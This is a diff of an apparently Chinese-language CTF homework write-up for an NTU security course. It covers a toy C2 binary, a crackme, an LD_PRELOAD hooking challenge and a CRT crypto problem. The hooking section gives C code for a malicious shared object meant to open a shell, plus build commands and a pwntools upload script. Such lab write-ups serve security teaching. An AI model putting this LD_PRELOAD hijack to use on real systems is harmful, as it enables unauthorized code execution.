@@ -8,9 +8,6 @@ date: 2024-01-31
 
 # NTU CS HW0 Write Up
 <!-- more -->
-:::spoiler TOC
-[TOC]
-:::
 
 ## Easy C2
 * Flag: `FLAG{C2_cmd_in_http_header}`
@@ -23,12 +20,12 @@ Google 關鍵字：IDA freeware、Ghidra、malware C2
 
 ### 解題思路
 1. Simple 解題思路
-    ```bash!
+    ```bash
     $ file easy-c2
     easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
     ```
 2. IDA
-    ```cpp!
+    ```cpp
     int __cdecl main(int argc, const char **argv, const char **envp)
     {
       int sockfd; // [rsp+1Ch] [rbp-24h]
@@ -53,7 +50,7 @@ Google 關鍵字：IDA freeware、Ghidra、malware C2
     可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息
 
 ### Exploit
-```bash!
+```bash
 $ nc -lvp 11187
 Listening on 0.0.0.0 11187
 Connection received on localhost 54028
@@ -69,7 +66,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 
 ### 解題思路
 1. Simple 解題思路
-    ```bash!
+    ```bash
     $ file baby-crackme
     baby-crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cc98ffd919e39311d3014a8bd77c2c8968ca2a9, for GNU/Linux 3.2.0, stripped
     $ ./baby-crackme
@@ -78,62 +75,60 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
     Invalid license!
     ```
 2. IDA
-    :::spoiler IDA Decompile Code(Main Function)
-    ```cpp!
-    __int64 __fastcall main(int a1, char **a2, char **a3)
-    {
-      __int64 input_flag[4]; // [rsp+0h] [rbp-30h] BYREF
-      int v5; // [rsp+20h] [rbp-10h]
-      unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+    * IDA Decompile Code(Main Function)
+        ```cpp
+        __int64 __fastcall main(int a1, char **a2, char **a3)
+        {
+        __int64 input_flag[4]; // [rsp+0h] [rbp-30h] BYREF
+        int v5; // [rsp+20h] [rbp-10h]
+        unsigned __int64 v6; // [rsp+28h] [rbp-8h]
 
-      v6 = __readfsqword(0x28u);
-      memset(input_flag, 0, sizeof(input_flag));
-      v5 = 0;
-      puts("========= Baby Validating Service =========");
-      printf("Enter the license >");
-      __isoc99_scanf("%35s", input_flag);
-      if ( scan_license(input_flag, 36LL, 0xBACEB00CLL) )
-        puts("Valid license!");
-      else
-        puts("Invalid license!");
-      return 0LL;
-    }
-    ```
-    :::
-    :::spoiler IDA Decompile Code(Scan License)
-    ```cpp!
-    _BOOL8 __fastcall scan_license(const char *input_flag, int a2, int _0xBACEB00C)
-    {
-      unsigned __int8 v5; // [rsp+1Bh] [rbp-35h]
-      int i; // [rsp+1Ch] [rbp-34h]
-      char s1[8]; // [rsp+20h] [rbp-30h] BYREF
-      __int64 v8; // [rsp+28h] [rbp-28h]
-      __int64 v9; // [rsp+30h] [rbp-20h]
-      __int64 v10; // [rsp+38h] [rbp-18h]
-      int v11; // [rsp+40h] [rbp-10h]
-      unsigned __int64 v12; // [rsp+48h] [rbp-8h]
+        v6 = __readfsqword(0x28u);
+        memset(input_flag, 0, sizeof(input_flag));
+        v5 = 0;
+        puts("========= Baby Validating Service =========");
+        printf("Enter the license >");
+        __isoc99_scanf("%35s", input_flag);
+        if ( scan_license(input_flag, 36LL, 0xBACEB00CLL) )
+            puts("Valid license!");
+        else
+            puts("Invalid license!");
+        return 0LL;
+        }
+        ```
+    * IDA Decompile Code(Scan License)
+        ```cpp
+        _BOOL8 __fastcall scan_license(const char *input_flag, int a2, int _0xBACEB00C)
+        {
+        unsigned __int8 v5; // [rsp+1Bh] [rbp-35h]
+        int i; // [rsp+1Ch] [rbp-34h]
+        char s1[8]; // [rsp+20h] [rbp-30h] BYREF
+        __int64 v8; // [rsp+28h] [rbp-28h]
+        __int64 v9; // [rsp+30h] [rbp-20h]
+        __int64 v10; // [rsp+38h] [rbp-18h]
+        int v11; // [rsp+40h] [rbp-10h]
+        unsigned __int64 v12; // [rsp+48h] [rbp-8h]
 
-      v12 = __readfsqword(0x28u);
-      *s1 = 0LL;
-      v8 = 0LL;
-      v9 = 0LL;
-      v10 = 0LL;
-      v11 = 0;
-      for ( i = 0; i < a2; ++i )
-      {
-        v5 = enc_flag[i];
-        s1[i] = v5 ^ _0xBACEB00C;
-        _0xBACEB00C = a2 - i + (v5 ^ __ROR4__(_0xBACEB00C, 1));
-      }
-      return strcmp(s1, input_flag) == 0;
-    }
-    ```
-    :::
+        v12 = __readfsqword(0x28u);
+        *s1 = 0LL;
+        v8 = 0LL;
+        v9 = 0LL;
+        v10 = 0LL;
+        v11 = 0;
+        for ( i = 0; i < a2; ++i )
+        {
+            v5 = enc_flag[i];
+            s1[i] = v5 ^ _0xBACEB00C;
+            _0xBACEB00C = a2 - i + (v5 ^ __ROR4__(_0xBACEB00C, 1));
+        }
+        return strcmp(s1, input_flag) == 0;
+        }
+        ```
     
 3. 如果按照上面得到的code寫script會出事，具體來說會出啥事不好說，但總之IDA時不時會翻不出來也見怪不怪，反正有問題一率動態跟，至於要跟到哪裡(因為沒有main symbol，所以也不好定位)，我是直接用pwntools的raw_input()強制斷在input的地方，接著就跳到比對的部分，然後flag就出現在stack上了
 
 ### Exploit
-```bash!
+```bash
 $ gdb
 gef➤ at {PID}
 gef➤ fin # until to scan_license function
@@ -148,13 +143,14 @@ gef➤ c
 Try to Hook Me :)
 
 nc edu-ctf.zoolab.org 10002
+
 Flag Format：FLAG{...}
 
 ### 解題思路
 這一題主要的想法很簡單，就是給他一個so file，然後她會直接用這個so file當作LD_PRELOAD，執行./chall，所以我們要做的事情概念很簡單，就是給他一個有問題的so file，然後當他執行椅面的function時，就會執行我們給他的惡意指令，例如開shell
 
 ### Exploit
-```cpp!
+```cpp
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdint.h>
@@ -173,7 +169,7 @@ void* sleep(size_t size)
 }
 ```
 
-```python!
+```python
 from base64 import b64encode
 from pwn import *
 
@@ -189,7 +185,7 @@ r.sendline(b64encode(ld_file))
 r.interactive()
 ```
 
-```bash!
+```bash
 $ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl
 $ LD_PRELOAD=./libmyhook.so ./chall    # To make sure it's working
 $ python exp.py
@@ -220,8 +216,7 @@ Easy crypto problem with simple tricks.
 Flag Format: FLAG{...}
 
 ### Source Code
-:::spoiler Source Code
-```python=
+```python
 from secret import flag
 from Crypto.Util.number import bytes_to_long, getPrime
 
@@ -247,53 +242,52 @@ print(f"mods = {xorrrrr(mods)}")
 # mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363]
 
 ```
-:::
 
 ### 解題思路
 我真的脫離crypto太久了，久沒做題就生疏了，這題其實也...沒那麼難，應該還是有點難啦
 1. Analyze Process
-首先這題做的事情很簡單，他先取得mods/muls各20組質數的list，然後和flag進行運算
-$$
-hint[0] = secret*muls[0]\ \%\ mods[0] \\
-...
-$$
-最後他有給經過scramble的hint/muls/mods，所以首要做的事情是把scramble後的結果還原
+    首先這題做的事情很簡單，他先取得mods/muls各20組質數的list，然後和flag進行運算
+    $$
+    hint[0] = secret*muls[0]\ \%\ mods[0] \\
+    ...
+    $$
+    最後他有給經過scramble的hint/muls/mods，所以首要做的事情是把scramble後的結果還原
 2. Descramble
-他做的事情其實很簡單，靜態看不太出來，動態跟一下就出現了，basically他就是做十九次，每一次都跟隔壁的element進行xor，例如：`muls[0, 1, 2, 3,..., 19]`，scramble的結果會變成
-$$
-muls[1\oplus 2\oplus 3\oplus ...\oplus 19,\\ 
-2\oplus 3\oplus 4\oplus ...\oplus 19\oplus 0,\\ 
-3\oplus 4\oplus 5\oplus ...\oplus 19\oplus 0\oplus 1,...]
-$$
-所以可以看得出來，因為只做19次，scramble後的第一個element缺少原本的element 0，而第二個element缺少原本的element 1，以此類推，所以要還原就很簡單了，我先把scramble後的所有element全部XOR，這樣就可以得到$0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19$的結果，然後再各自和scramble的element進行XOR，就可以extract出最一開始的element是多少
-$$
-Scrambled element = 1\oplus 2\oplus 3\oplus ...\oplus 19\\
-\oplus\\
-All\ element\ XOR = 0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19\\
-=original\ element\ 0
-$$
+    他做的事情其實很簡單，靜態看不太出來，動態跟一下就出現了，basically他就是做十九次，每一次都跟隔壁的element進行xor，例如：`muls[0, 1, 2, 3,..., 19]`，scramble的結果會變成
+    $$
+    muls[1\oplus 2\oplus 3\oplus ...\oplus 19,\\ 
+    2\oplus 3\oplus 4\oplus ...\oplus 19\oplus 0,\\ 
+    3\oplus 4\oplus 5\oplus ...\oplus 19\oplus 0\oplus 1,...]
+    $$
+    所以可以看得出來，因為只做19次，scramble後的第一個element缺少原本的element 0，而第二個element缺少原本的element 1，以此類推，所以要還原就很簡單了，我先把scramble後的所有element全部XOR，這樣就可以得到$0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19$的結果，然後再各自和scramble的element進行XOR，就可以extract出最一開始的element是多少
+    $$
+    Scrambled element = 1\oplus 2\oplus 3\oplus ...\oplus 19\\
+    \oplus\\
+    All\ element\ XOR = 0\oplus 1\oplus 2\oplus 3\oplus ...\oplus 19\\
+    =original\ element\ 0
+    $$
 3. Decrypt Flag
-有了hint/mods/muls最原始的這些東西，就可以開始想要怎麼藉由hint解密原本的flag，如果把整個equation換個表示式
-$$
-hint[0] = secret*muls[0]\ \%\ mods[0] \\
-...\\
-=\\
-secret*muls[0]\equiv\ hint[0]\ (mod\ mods[0])\\
-secret*muls[1]\equiv\ hint[1]\ (mod\ mods[1])\\
-secret*muls[2]\equiv\ hint[2]\ (mod\ mods[2])\\
-...
-$$
-這和CRT有一點像，但CRT解的問題是secret都要一樣，所以只要把兩邊同乘以${muls[i]}^{-1}$就可以了
-$$
-secret\equiv\ hint[0]*{muls[0]}^{-1}\ (mod\ mods[0])\\
-secret\equiv\ hint[1]*{muls[1]}^{-1}\ (mod\ mods[1])\\
-secret\equiv\ hint[2]*{muls[2]}^{-1}\ (mod\ mods[2])\\
-...
-$$
-再利用CRT的解法，secret就出來了
+    有了hint/mods/muls最原始的這些東西，就可以開始想要怎麼藉由hint解密原本的flag，如果把整個equation換個表示式
+    $$
+    hint[0] = secret*muls[0]\ \%\ mods[0] \\
+    ...\\
+    =\\
+    secret*muls[0]\equiv\ hint[0]\ (mod\ mods[0])\\
+    secret*muls[1]\equiv\ hint[1]\ (mod\ mods[1])\\
+    secret*muls[2]\equiv\ hint[2]\ (mod\ mods[2])\\
+    ...
+    $$
+    這和CRT有一點像，但CRT解的問題是secret都要一樣，所以只要把兩邊同乘以${muls[i]}^{-1}$就可以了
+    $$
+    secret\equiv\ hint[0]*{muls[0]}^{-1}\ (mod\ mods[0])\\
+    secret\equiv\ hint[1]*{muls[1]}^{-1}\ (mod\ mods[1])\\
+    secret\equiv\ hint[2]*{muls[2]}^{-1}\ (mod\ mods[2])\\
+    ...
+    $$
+    再利用CRT的解法，secret就出來了
 
 ### Exploit
-```python=
+```python
 from Crypto.Util.number import *
 from functools import reduce
 
